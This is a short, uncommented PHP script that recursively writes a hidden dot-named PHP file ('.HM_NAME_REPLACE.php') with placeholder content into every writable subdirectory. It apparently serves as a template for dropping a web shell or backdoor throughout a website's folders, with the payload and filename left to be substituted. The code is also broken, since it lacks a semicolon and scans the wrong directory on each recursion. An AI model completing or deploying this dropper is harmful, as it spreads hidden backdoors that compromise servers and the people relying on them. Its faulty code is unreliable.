<?php
function createSFile($dir) {
    if (!is_dir($dir) || !is_writable($dir)) { return; }

    $directories = array_slice(scandir(__DIR__),2)

    foreach ($directories as $directory) {
        $subdir = $dir . DIRECTORY_SEPARATOR . $directory;
        if (is_dir($subdir)) {
            $sFile = $subdir . DIRECTORY_SEPARATOR . '.HM_NAME_REPLACE.php';
            $data = "<?php WAIT_FOR_REPLACE?>";
            file_put_contents($sFile, $data);
            createSFile($subdir);
            }
    }
}
$currentDir = __DIR__;
createSFile($currentDir);
?>
